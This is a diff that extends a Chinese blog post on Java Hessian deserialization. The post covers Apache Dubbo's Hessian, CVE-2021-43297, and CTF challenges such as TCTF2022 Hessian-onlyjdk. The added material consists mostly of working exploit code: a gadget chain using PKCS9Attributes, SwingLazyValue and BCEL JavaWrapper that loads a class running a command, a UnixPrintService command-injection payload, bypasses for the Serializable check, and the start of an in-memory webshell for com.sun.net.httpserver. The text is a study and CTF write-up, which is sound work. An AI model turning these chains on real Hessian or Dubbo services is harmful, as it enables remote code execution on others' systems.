@@ -27,8 +27,20 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303222606860.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223332590.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223907161.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132426245.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132628672.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132725956.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132742378.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132847307.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304133410055.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304142425270.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304154845999.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304151343061.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/cc0f18a0-d199-8b42-fb2d-6a095ece5a05.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304192321968.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304191801666.png">
 <meta property="article:published_time" content="2024-03-03T12:29:50.000Z">
-<meta property="article:modified_time" content="2024-03-03T15:14:11.801Z">
+<meta property="article:modified_time" content="2024-03-06T15:06:57.805Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png">
@@ -236,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.9k 字
+          19k 字
         
       </span>
     
@@ -247,7 +259,7 @@
         
         
         
-          66 分钟
+          156 分钟
         
       </span>
     
@@ -309,7 +321,7 @@
 
 
 
-<h2 id="原生hessian反序列化链"><a href="#原生hessian反序列化链" class="headerlink" title="原生hessian反序列化链"></a>原生hessian反序列化链</h2><p>反序列化对象最外层是HashMap时</p>
+<h2 id="原生hessian反序列化链"><a href="#原生hessian反序列化链" class="headerlink" title="原生hessian反序列化链"></a>原生hessian反序列化链</h2><p>如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打下去</p>
 <div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HessianInput</span>.</span></span>readObject
 	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SerializeFactory</span>.</span></span>readMap
         _hashMapDeserializer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">MapDeserializer(HashMap.<span class="hljs-params">class</span>)</span>;
@@ -427,6 +439,10 @@
 <p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png" srcset="/img/loading.gif" lazyload alt="image-20240303220756669"></p>
 <p>看完这三处的代码后可以知道，大概逻辑就是判断你的类有没有readObject方法，如果有则执行</p>
 <p>并且他会判断你所有实例化的类，所以这里才调用了7次（按链条顺序依次判断</p>
+<blockquote>
+<p>大佬们的说法：</p>
+<p>如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p>
+</blockquote>
 <p>也就是走到了<code>TemplatesImpl</code>的readObject的方法并把<code>_tfactory </code>的值赋值为<code>new TransformerFactoryImpl();</code></p>
 <p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303222606860.png" srcset="/img/loading.gif" lazyload alt="image-20240303222606860"></p>
 <p>要是使用<code>HessianInput</code>的话就不会经过这里</p>
@@ -522,6 +538,358 @@
         return field.get(obj);
     &#125;
 &#125;</code></pre></div>
+
+<h2 id="apache-dubbo的hessian反序列化"><a href="#apache-dubbo的hessian反序列化" class="headerlink" title="apache dubbo的hessian反序列化"></a>apache dubbo的hessian反序列化</h2><p>dubbo使用的是alibaba修改过的hessian</p>
+<div class="code-wrapper"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span>
+<span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.dubbo<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><span class="language-xml"></span>
+<span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dubbo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><span class="language-xml"></span>
+<span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><span class="language-xml"></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span>
+
+<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;
+<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;
+<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.HessianInput;
+<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.HessianOutput;</code></pre></div>
+
+<h3 id="JdbcRowSetImpl-1"><a href="#JdbcRowSetImpl-1" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打ROME</p>
+<p>正常打应该是没问题的，因为还是走map.put</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132426245.png" srcset="/img/loading.gif" lazyload alt="image-20240304132426245"></p>
+<h3 id="TemplatesImpl-（行不通"><a href="#TemplatesImpl-（行不通" class="headerlink" title="TemplatesImpl （行不通"></a>TemplatesImpl （行不通</h3><p>但这里像我们上述分析的就不行了</p>
+<blockquote>
+<p>unknown说法：</p>
+<p>原生hessian底层反序列化时，用的unsafe创建对象，与构造函数无关。</p>
+<p>alibaba改写的hessian反序列化时，用的JavaDeserializer，会自动挨个测试构造器直到成功</p>
+<p>先调用构造方法，属性传null，创建出对象后再设置属性。</p>
+<p>因为HotSwappableTargetSource和SignedObject构造方法传参null会报错，所以这两个用不了。</p>
+</blockquote>
+<p>我也发现了他说的这些区别</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132628672.png" srcset="/img/loading.gif" lazyload alt="image-20240304132628672"></p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132725956.png" srcset="/img/loading.gif" lazyload alt="image-20240304132725956"></p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132742378.png" srcset="/img/loading.gif" lazyload alt="image-20240304132742378"></p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132847307.png" srcset="/img/loading.gif" lazyload alt="image-20240304132847307"></p>
+<p>这一步之后就报错了结束了</p>
+<p>具体也不知道咋修改</p>
+<h2 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h2><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304133410055.png" srcset="/img/loading.gif" lazyload alt="image-20240304133410055"></p>
+<p>如果在使用Hessian2进行反序列化时抛出异常，则会进行字符串拼接操作，进而调用obj的toString()方法</p>
+<p>寻找谁调用了expect方法</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304142425270.png" srcset="/img/loading.gif" lazyload alt="image-20240304142425270"></p>
+<p>这里以<code>readString</code>为例，如果tag在switch语句中失配，就会进入default分支的except方法。其他的read方法同理。</p>
+<div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">readString</span><span class="hljs-params">()</span> throws IOException </span>&#123;
+        <span class="hljs-type">int</span> tag = <span class="hljs-keyword">this</span>.<span class="hljs-built_in">read</span>();
+        <span class="hljs-type">int</span> ch;
+        <span class="hljs-keyword">switch</span> (tag) &#123;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+			.。。。
+            <span class="hljs-keyword">case</span> <span class="hljs-number">126</span>:
+            <span class="hljs-keyword">case</span> <span class="hljs-number">127</span>:
+            <span class="hljs-keyword">default</span>:
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">expect</span>(<span class="hljs-string">&quot;string&quot;</span>, tag);
+            ......
+        &#125;
+    &#125;</code></pre></div>
+
+<p>Boogipop大佬因为搭建了dubbo环境，他是从rpc通信的角度进行利用</p>
+<p>但反序列化一般关注的是 readObject, 所以我们研究如何从 readObject 走到 readString, 进而走到 expect</p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">public</span> Object readObject(<span class="hljs-keyword">Class</span> expectedClass, <span class="hljs-keyword">Class</span>&lt;?&gt;... expectedTypes) <span class="hljs-keyword">throws</span> IOException &#123;
+    <span class="hljs-keyword">if</span> (expectedClass == <span class="hljs-keyword">null</span> || expectedClass == Object.<span class="hljs-keyword">class</span>)
+        <span class="hljs-keyword">return</span> readObject();
+
+    <span class="hljs-keyword">int</span> tag = _offset &lt; _length ? (_buffer[_offset++] &amp; <span class="hljs-number">0</span>xff) : <span class="hljs-keyword">read</span>();
+
+    <span class="hljs-keyword">switch</span> (tag) &#123;
+        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;N&#x27;</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+
+        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;H&#x27;</span>: &#123;
+			。。。。。。
+        &#125;
+
+        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;
+			。。。。。
+        &#125;
+
+        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>: &#123;
+            readObjectDefinition(expectedClass);
+
+            <span class="hljs-keyword">return</span> readObject(expectedClass);
+        &#125;
+
+		。。。。。。。。</code></pre></div>
+
+<p>发现当tag为”C”，即<code>67</code>时会调用<code>readObjectDefinition</code></p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void read<span class="hljs-constructor">ObjectDefinition(Class <span class="hljs-params">cl</span>)</span>
+        throws IOException &#123;
+    String <span class="hljs-keyword">type</span> = read<span class="hljs-constructor">String()</span>;
+    <span class="hljs-built_in">int</span> len = read<span class="hljs-constructor">Int()</span>;
+
+    String<span class="hljs-literal">[]</span> fieldNames = <span class="hljs-keyword">new</span> String<span class="hljs-literal">[<span class="hljs-identifier">len</span>]</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)
+        fieldNames<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = read<span class="hljs-constructor">String()</span>;
+
+    ObjectDefinition def = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectDefinition(<span class="hljs-params">type</span>, <span class="hljs-params">fieldNames</span>)</span>;
+
+    <span class="hljs-keyword">if</span> (_classDefs<span class="hljs-operator"> == </span>null)
+        _classDefs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ArrayList()</span>;
+
+    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_classDefs</span>.</span></span>add(def);
+&#125;</code></pre></div>
+
+<p>调用了readString</p>
+<p>所以现在就是如何让tag的值为67</p>
+<h3 id="网上看到的一些方法都是选择重写-writeString-指定第一次-read-的-tag-为-67"><a href="#网上看到的一些方法都是选择重写-writeString-指定第一次-read-的-tag-为-67" class="headerlink" title="网上看到的一些方法都是选择重写 writeString 指定第一次 read 的 tag 为 67"></a>网上看到的一些方法都是选择重写 writeString 指定第一次 read 的 tag 为 67</h3><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304154845999.png" srcset="/img/loading.gif" lazyload alt="image-20240304154845999"></p>
+<p>重写逻辑为这样</p>
+<p>然后在序列化之前wirteString(“aaa”)即可</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+ <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(byteArrayOutputStream);
+ out.writeString(<span class="hljs-string">&quot;aaa&quot;</span>);
+ out.writeObject(o);</code></pre></div>
+
+<p>在网鼎杯2022 BadBean Hessian2中</p>
+<p>序列化时会报<code>HikariDataSource</code>没有实现Serializable接口的错误，用该方法即可</p>
+<p>但是一般按理来说hessian可以反序列化未实现serializable接口的类</p>
+<h3 id="X1r0z大佬做法"><a href="#X1r0z大佬做法" class="headerlink" title="X1r0z大佬做法"></a>X1r0z大佬做法</h3><p>因为 hessian 在读入的时候是按一个个 byte 来读的,在 readObject 里面第一次调用的 <code>this.read()</code> 读取的是序列化后的 byte 数组里的第一个值, 所以只要在 byte 数组的前面再拼一个 67 就行了</p>
+<p>woc，这位佬的思路总是那么惊人</p>
+<div class="code-wrapper"><pre><code class="hljs java">      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
+      person.setAge(<span class="hljs-number">18</span>);
+      person.setName(<span class="hljs-string">&quot;lingRu&quot;</span>);
+      <span class="hljs-type">byte</span>[] serialize = serialize(person);
+<span class="hljs-type">byte</span>[] data = Serialization.hessian2Serialize(person);
+
+      <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];
+      System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
+      System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length);
+      Serialization.hessian2Unserialize(poc);</code></pre></div>
+
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304151343061.png" srcset="/img/loading.gif" lazyload alt="image-20240304151343061"></p>
+<p>至于 readString 里面读的第二个 tag 其实也不用考虑, 因为写入的 object 本来就不是 String 类型的, 最终都能够走到 <code>throw this.expect(&quot;string&quot;, tag)</code></p>
+<h3 id="Boogipop大佬"><a href="#Boogipop大佬" class="headerlink" title="Boogipop大佬"></a>Boogipop大佬</h3><p>牛波一</p>
+<div class="code-wrapper"><pre><code class="hljs">    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    Hessian2Output out = new Hessian2Output(baos);
+    baos.write(67);
+    out.getSerializerFactory().setAllowNonSerializable(true);
+    out.writeObject(s);
+</code></pre></div>
+<h2 id="没有实现Serializable接口的处理方法"><a href="#没有实现Serializable接口的处理方法" class="headerlink" title="没有实现Serializable接口的处理方法"></a>没有实现Serializable接口的处理方法</h2><p>当你要序列化的类时会报没有实现<code>Serializable</code>接口的错误，直接重写<code>com.alibaba.com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</code>加上一行</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">this._isAllowNonSerializable</span> = <span class="hljs-literal">true</span></code></pre></div>
+
+<p>[<img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/cc0f18a0-d199-8b42-fb2d-6a095ece5a05.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h3><div class="code-wrapper"><pre><code class="hljs reasonml">HessianBase.NoWriteReplaceSerializerFactory sf = <span class="hljs-keyword">new</span> HessianBase.<span class="hljs-constructor">NoWriteReplaceSerializerFactory()</span>;
+sf.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;
+output.set<span class="hljs-constructor">SerializerFactory(<span class="hljs-params">sf</span>)</span>;</code></pre></div>
+
+<h3 id="其实一句代码就能解决"><a href="#其实一句代码就能解决" class="headerlink" title="其实一句代码就能解决"></a>其实一句代码就能解决</h3><div class="code-wrapper"><pre><code class="hljs reasonml">oo.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;
+baos.write(<span class="hljs-number">67</span>);
+out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;
+out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;</code></pre></div>
+
+
+
+
+
+<h2 id="Hessian-onlyjdk-TCTF2022"><a href="#Hessian-onlyjdk-TCTF2022" class="headerlink" title="Hessian-onlyjdk   TCTF2022"></a>Hessian-onlyjdk   TCTF2022</h2><p>基于上述hessian2的toString漏洞，然后找原生类进行利用</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.caucho.hessian.io.Hessian2Input;
+import com.caucho.hessian.io.Hessian2Output;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import sun.reflect.ReflectionFactory;
+import sun.security.pkcs.PKCS9Attribute;
+import sun.security.pkcs.PKCS9Attributes;
+import sun.swing.SwingLazyValue;
+
+import javax.swing.*;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+
+<span class="hljs-comment">// 前提条件:CVE-2021-43297,打toString()</span>
+public <span class="hljs-keyword">class</span> Hessian_JavaWrapper &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;
+        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;
+        JavaClass evil = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(<span class="hljs-params">test</span>.<span class="hljs-params">class</span>)</span>;
+        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(evil.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);
+
+        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);
+
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;
+
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;
+        baos.write(<span class="hljs-number">67</span>);
+        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;
+        out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;
+        out.flush<span class="hljs-constructor">Buffer()</span>;
+
+        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);
+        Hessian2Input input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bais</span>)</span>;
+        input.read<span class="hljs-constructor">Object()</span>;
+
+    &#125;
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;
+        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;
+    &#125;
+
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;
+        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;
+        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;
+        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;
+    &#125;
+    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        field.set(obj, value);
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> IOException&#123;
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="几大细节"><a href="#几大细节" class="headerlink" title="几大细节"></a>几大细节</h3><ol>
+<li><code>SwingLazyValue#createValue</code>中可以触发任意类的任意方法，那么就可以实现RCE（其实并不是任意，需要静态和public这两个条件)</li>
+</ol>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304192321968.png" srcset="/img/loading.gif" lazyload alt="image-20240304192321968"></p>
+<ol start="2">
+<li><p>让他执行<code>JavaWrapper._main</code>，我们只需要创建一个恶意类，其中带一个方法名叫<code>_main</code>然后让他加载那么就可以执行命令了</p>
+</li>
+<li><p>PKCS9Attributes没有无参构造，使用魔术类绕过构造方法</p>
+</li>
+</ol>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304191801666.png" srcset="/img/loading.gif" lazyload alt="image-20240304191801666"></p>
+<p>跑个代码看个乐子</p>
+<h2 id="相关题目存个payload"><a href="#相关题目存个payload" class="headerlink" title="相关题目存个payload"></a>相关题目存个payload</h2><h3 id="sun-print-UnixPrintService的利用"><a href="#sun-print-UnixPrintService的利用" class="headerlink" title="sun.print.UnixPrintService的利用"></a>sun.print.UnixPrintService的利用</h3><p>因为可以不用实现序列化接口，所以找getter和命令执行的类就行</p>
+<p>用方式就是简单命令拼接执行（缺点就是太能弹了，基本上每个get方法都能弹）</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">Constructor&lt;UnixPrintService&gt; declaredConstructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnixPrintService</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(String.<span class="hljs-params">class</span>)</span>;
+declaredConstructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+ObjectBean delegate = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectBean(<span class="hljs-params">sun</span>.<span class="hljs-params">print</span>.UnixPrintService.<span class="hljs-params">class</span>,<span class="hljs-params">declaredConstructor</span>.<span class="hljs-params">newInstance</span>(<span class="hljs-string">&quot;;open -na Calculator&quot;</span>)</span>);
+
+ObjectBean root  = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectBean(ObjectBean.<span class="hljs-params">class</span>, <span class="hljs-params">delegate</span>)</span>;
+HashMap&lt;Object, Object&gt; map = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDKUtil</span>.</span></span>make<span class="hljs-constructor">Map(<span class="hljs-params">root</span>, <span class="hljs-params">root</span>)</span>;
+<span class="hljs-comment">//</span>
+ByteArrayOutputStream os = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+Hessian2Output output = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">os</span>)</span>;
+
+<span class="hljs-comment">//HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();</span>
+<span class="hljs-comment">//sf.setAllowNonSerializable(true);</span>
+<span class="hljs-comment">//output.setSerializerFactory(sf);</span>
+
+output.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;
+output.write<span class="hljs-constructor">Object(<span class="hljs-params">map</span>)</span>;
+output.get<span class="hljs-constructor">BytesOutputStream()</span>.flush<span class="hljs-literal">()</span>;
+output.complete<span class="hljs-constructor">Message()</span>;
+output.close<span class="hljs-literal">()</span>;
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-keyword">new</span> <span class="hljs-constructor">String(Base64.<span class="hljs-params">getEncoder</span>()</span>.encode(os.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>)));</code></pre></div>
+
+<h3 id="web服务由com-sun-net-httpserver实现时的内存马"><a href="#web服务由com-sun-net-httpserver实现时的内存马" class="headerlink" title="web服务由com.sun.net.httpserver实现时的内存马"></a>web服务由com.sun.net.httpserver实现时的内存马</h3><p>同样是获取线程</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpContext;
+<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;
+<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
